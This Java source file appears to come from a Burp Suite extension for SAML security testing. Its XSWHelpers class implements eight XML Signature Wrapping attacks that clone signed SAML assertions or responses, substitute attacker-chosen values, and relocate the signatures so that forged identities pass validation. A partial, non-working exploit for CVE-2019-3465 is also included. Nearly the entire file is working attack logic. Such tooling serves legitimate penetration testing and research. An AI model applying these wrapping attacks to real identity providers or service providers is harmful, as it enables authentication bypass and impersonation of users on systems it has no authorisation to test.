package helpers;

import model.BurpCertificateBuilder;
import burp.BurpExtender;
import helpers.DiffMatchPatch.Diff;
import helpers.DiffMatchPatch.LinesToCharsResult;

import java.io.IOException;
import java.security.*;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.HashMap;
import java.util.LinkedList;

import model.BurpCertificate;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;

public class XSWHelpers {

    // XSW9 was removed b/c it does not work. Code is still there if you want to have a look :)
    public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8"};

    public static final HashMap<String, String> MATCH_AND_REPLACE_MAP = new HashMap<>();

    /*
     * Following are the 8 common XML Signature Wrapping attacks implemented, which
     * were found in a paper called "On Breaking SAML: Be Whoever You Want to Be" We
     * have also documented these attacks in our product documentation for further
     * information
     *
     */

    public void applyXSW(String xswType, Document document) {
        switch (xswType) {
            case "XSW1":
                applyXSW1(document);
                break;
            case "XSW2":
                applyXSW2(document);
                break;
            case "XSW3":
                applyXSW3(document);
                break;
            case "XSW4":
                applyXSW4(document);
                break;
            case "XSW5":
                applyXSW5(document);
                break;
            case "XSW6":
                applyXSW6(document);
                break;
            case "XSW7":
                applyXSW7(document);
                break;
            case "XSW8":
                applyXSW8(document);
                break;
            case "XSW9":
                applyXSW9(document);
                break;
        }
    }

    // Fixed - clonedSignature was not found in clonedResponse
    public void applyXSW1(Document document) {
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element clonedResponse = (Element) response.cloneNode(true);
        // The Original response will be the evil one
        applyMatchAndReplaceValues(response);
        Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
        clonedSignature.getParentNode().removeChild(clonedSignature);
        Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
        signature.appendChild(clonedResponse);
        response.setAttribute("ID", "_evil_response_ID");
    }

    // Fixed - clonedSignature was not found in clonedResponse
    public void applyXSW2(Document document) {
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element clonedResponse = (Element) response.cloneNode(true);
        // The Original response will be the evil one
        applyMatchAndReplaceValues(response);
        Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
        clonedSignature.getParentNode().removeChild(clonedSignature);
        Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
        signature.getParentNode().insertBefore(clonedResponse, signature);
        response.setAttribute("ID", "_evil_response_ID");
    }

    public void applyXSW3(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
        evilAssertion.removeChild(copiedSignature);
        document.getDocumentElement().insertBefore(evilAssertion, assertion);
    }

    public void applyXSW4(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
        evilAssertion.removeChild(copiedSignature);
        document.getDocumentElement().appendChild(evilAssertion);
        evilAssertion.appendChild(assertion);
    }

    public void applyXSW5(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        document.getDocumentElement().appendChild(assertion);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
    }

    public void applyXSW6(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        originalSignature.appendChild(assertion);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
    }

    public void applyXSW7(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element extensions = document.createElement("Extensions");
        document.getDocumentElement().insertBefore(extensions, assertion);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.removeChild(copiedSignature);
        extensions.appendChild(evilAssertion);
    }

    public void applyXSW8(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        Element object = document.createElement("Object");
        originalSignature.appendChild(object);
        object.appendChild(assertion);
    }

    /*
     * CVE-2019-3465
     * XMLSecLibs <= 31.4.2, 2.1.0 & 3.0.3
     * SimpleSAMLphp <= 1.17.6
     * Duo Authentication Gateway (DAG) <= 1.5.9 (https://duo.com/labs/psa/duo-psa-2019-002)
     * Moodle auth_saml2 < 2019110701 (https://twitter.com/Catalyst_IT_AU/status/1192353402753208320)
     * Advisory: https://simplesamlphp.org/security/201911-01
     * Vuln. discovery and write up by Hackmanit:
     * https://www.hackmanit.de/en/blog-en/82-xml-signature-validation-bypass-in-simplesamlphp-and-xmlseclibs
     * Tweet by @jurajsomorovsky: https://twitter.com/jurajsomorovsky/status/1192452032835325952
     *
     * TODO: This does not yet work :/
     */
    public void applyXSW9(Document document) {

        try {
            XMLHelpers xmlHelpers = new XMLHelpers();

            // Calculate new digest by signing the document
            Document documentToSign = xmlHelpers.getXMLDocumentOfSAMLMessage(xmlHelpers.getStringOfDocument(document, 2, true));
            Element evilAssertion = (Element) documentToSign.getElementsByTagNameNS("*", "Assertion").item(0);
            evilAssertion.setAttribute("ID", "_evil_assertion_ID");
            applyMatchAndReplaceValues(evilAssertion);
            Document documentNewDigest = selfSignAssertion(documentToSign);

            // Remove new SignatureValue and KeyInfo
            Element newAssertion = (Element) documentNewDigest.getElementsByTagNameNS("*", "Assertion").item(0);
            Element signatureToModify = (Element) newAssertion.getElementsByTagNameNS("*", "Signature").item(0);
            Element signatureValueToRemove = (Element) newAssertion.getElementsByTagNameNS("*", "SignatureValue").item(0);
            signatureToModify.removeChild(signatureValueToRemove);
            Element keyInfoToRemove = (Element) newAssertion.getElementsByTagNameNS("*", "KeyInfo").item(0);
            signatureToModify.removeChild(keyInfoToRemove);

            // Read original SignatureValue, KeyInfo & SignedInfo
            Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
            Element originalSignatureValue = (Element) originalAssertion.getElementsByTagNameNS("*", "SignatureValue").item(0);
            Element originalKeyInfo = (Element) originalAssertion.getElementsByTagNameNS("*", "KeyInfo").item(0);
            Element originalSignedInfo = (Element) originalAssertion.getElementsByTagNameNS("*", "SignedInfo").item(0);

            // Add original SignatureValue and KeyInfo to new document
            Element fakeSignedInfo = (Element) newAssertion.getElementsByTagNameNS("*", "SignedInfo").item(0);
            signatureToModify.insertBefore(documentNewDigest.adoptNode(originalSignedInfo.cloneNode(true)), fakeSignedInfo);
            signatureToModify.insertBefore(documentNewDigest.adoptNode(originalSignatureValue.cloneNode(true)), fakeSignedInfo);
            // signatureToModify.insertBefore(documentNewDigest.adoptNode(originalKeyInfo.cloneNode(true)), fakeSignedInfo);

            // Add wrapper element and original assertion to the end
            Element wrapper = documentNewDigest.createElement("Wrapper");
            newAssertion.getParentNode().appendChild(wrapper);
            wrapper.appendChild(documentNewDigest.adoptNode(originalAssertion.cloneNode(true)));

            // Print for testing...
            System.out.println(xmlHelpers.getStringOfDocument(documentNewDigest, 2, true));

        } catch (IOException | SAXException e) {
            BurpExtender.api.logging().logToError(e);
        }
    }

    // Used for XSW9
    private Document selfSignAssertion(Document document) {

        try {
            BurpCertificateBuilder burpCertificateBuilder = new BurpCertificateBuilder("CN=samlraider-temporary-cert.example.net");
            BurpCertificate burpCertificate = burpCertificateBuilder.generateSelfSignedCertificate();
            XMLHelpers xmlHelpers = new XMLHelpers();

            NodeList assertions = xmlHelpers.getAssertions(document);
            String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
            String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));
            xmlHelpers.removeAllSignatures(document);

            String string = xmlHelpers.getString(document);
            Document documentToSign = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
            xmlHelpers.removeEmptyTags(documentToSign);
            xmlHelpers.signAssertion(documentToSign, signAlgorithm, digestAlgorithm, burpCertificate.getCertificate(), burpCertificate.getPrivateKey());
            return documentToSign;

        } catch (InvalidKeyException | NoSuchAlgorithmException | SignatureException | NoSuchProviderException |
                 InvalidKeySpecException | IOException | CertificateException | XMLSignatureException | SAXException |
                 MarshalException e) {
            BurpExtender.api.logging().logToError(e);
        }
        return null;
    }

    public String diffLineMode(String text1, String text2) {
        DiffMatchPatch differ = new DiffMatchPatch();
        differ.diffTimeout = 5;
        LinesToCharsResult result = differ.diffLinesToChars(text1, text2);

        LinkedList<Diff> diffs = differ.diffMain(result.chars1, result.chars2, false);
        differ.diffCharsToLines(diffs, result.lineArray);
        return differ.diffPrettyHtml(diffs);
    }

    public void applyMatchAndReplaceValues(Node elem) {
        for (int i = 0; i < elem.getChildNodes().getLength(); i++) {
            Node currentNode = elem.getChildNodes().item(i);
            if (currentNode.getNodeType() == Node.ELEMENT_NODE) {
                applyMatchAndReplaceValues(currentNode);
            } else {
                if (!currentNode.getNodeValue().trim().equals("")) {
                    for (String matchString : MATCH_AND_REPLACE_MAP.keySet()) {
                        if (currentNode.getNodeValue().equals(matchString)) {
                            currentNode.setNodeValue(MATCH_AND_REPLACE_MAP.get(matchString));
                        }
                    }
                }
            }
        }
    }
}